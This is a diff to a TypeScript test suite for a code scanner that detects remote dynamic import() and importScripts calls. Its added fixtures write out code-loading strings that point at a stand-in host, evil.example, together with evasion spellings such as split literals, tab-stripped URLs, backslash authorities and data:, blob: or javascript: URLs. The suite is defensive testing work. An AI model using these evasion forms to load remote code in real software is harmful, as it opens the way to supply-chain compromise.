@@ -18,6 +18,7 @@ import {
   BUILT_CODE_SINKS,
   DYNAMIC_CODE_SINKS,
   findDynamicCodeSinks,
+  REMOTE_DYNAMIC_IMPORT_SINK,
   REMOTE_IMPORT_SCRIPTS_SINK,
   SOURCE_CODE_SINKS,
   scanSourceForSinks,
@@ -233,6 +234,40 @@ describe('string timers (implicit eval)', () => {
   });
 });
 
+describe('remote dynamic import()', () => {
+  // Round 19. This was a REGEX anchored on the scheme immediately after the
+  // opening quote, so a split literal walked past it. As a sink spec the
+  // specifier gets the analyzer's constant folding and every call spelling,
+  // and the same same-origin allowlist as `importScripts`.
+  const dyn = (code: string): boolean =>
+    findDynamicCodeSinks(code, [REMOTE_DYNAMIC_IMPORT_SINK]).length > 0;
+
+  it.each([
+    "import('https://evil.example/x.js')",
+    "import('ht' + 'tps://evil.example/x.js')",
+    "import('data:text/javascript,x')",
+    "import('//evil.example/x.js')",
+    `import(\`https://evil.example/$${'{'}name}.js\`)`,
+    "await import('https://evil.example/x.js')",
+  ])('catches %s', (code) => {
+    expect(dyn(code)).toBe(true);
+  });
+
+  it.each([
+    "import('./local.js')",
+    "import('/assets/chunk.js')",
+    "import('@licio/lcap-p2p')", // a bare specifier the bundler resolves
+    'import(modulePath)',
+    // A STATIC import is not a call, so none of these can match.
+    "import { x } from '@licio/shared';",
+    "import * as y from './y.js';",
+    "import 'side-effect.js';",
+    'const d = import.meta.dirname;',
+  ])('does not flag %s', (code) => {
+    expect(dyn(code)).toBe(false);
+  });
+});
+
 describe('remote importScripts', () => {
   const remote = (code: string): boolean =>
     findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK]).length > 0;
@@ -256,6 +291,23 @@ describe('remote importScripts', () => {
     "Reflect.apply(importScripts, self, ['/a.js', 'https://evil.example/x.js'])",
     "self['importScripts']('/a.js', 'https://evil.example/x.js')",
     "importScripts('/a.js', 'ht' + 'tps://evil.example/x.js')",
+    // Round 19: the check is an ALLOWLIST of same-origin forms, not a denylist
+    // of remote schemes. Listing `http(s)://` and `//` let every other scheme
+    // through, and `data:` / `blob:` / `javascript:` all carry executable code.
+    "importScripts('data:text/javascript,postMessage(1)')",
+    "importScripts('blob:https://evil.example/x')",
+    "importScripts('javascript:alert(1)')",
+    "importScripts('file:///etc/x.js')",
+    "importScripts('DATA:text/javascript,x')", // scheme match is case-insensitive
+    "importScripts('/a.js', 'data:text/javascript,x')",
+    // URL-parser normalisation: tabs/newlines are stripped anywhere in a URL
+    // and leading spaces trimmed, so these fetch a remote origin as written.
+    "importScripts('ht\ttps://evil.example/x.js')",
+    "importScripts('  https://evil.example/x.js')",
+    // A leading `\` is a `/` for a special scheme, so two of either is an
+    // AUTHORITY — protocol-relative by another spelling.
+    String.raw`importScripts('\\\\evil.example/x.js')`,
+    String.raw`importScripts('/\\evil.example/x.js')`,
   ])('catches %s', (code) => {
     expect(remote(code)).toBe(true);
   });
@@ -265,6 +317,13 @@ describe('remote importScripts', () => {
     'importScripts(l);',
     "importScripts('/a.js', '/b.js')",
     "importScripts.apply(self, ['/a.js', '/b.js'])",
+    // Same-origin forms — the allowlist must not swallow ordinary workers.
+    "importScripts('./x.js')",
+    "importScripts('/a.js', 'b.js', './c.js')",
+    "importScripts('/assets/' + name + '.js')",
+    // ONE leading slash-or-backslash is an absolute PATH on this origin, not
+    // an authority, so it stays clean where two do not.
+    String.raw`importScripts('\\evil.example/x.js')`,
     '// code imported by the generated worker via importScripts — same-origin only',
   ])('does not flag %s', (code) => {
     expect(remote(code)).toBe(false);
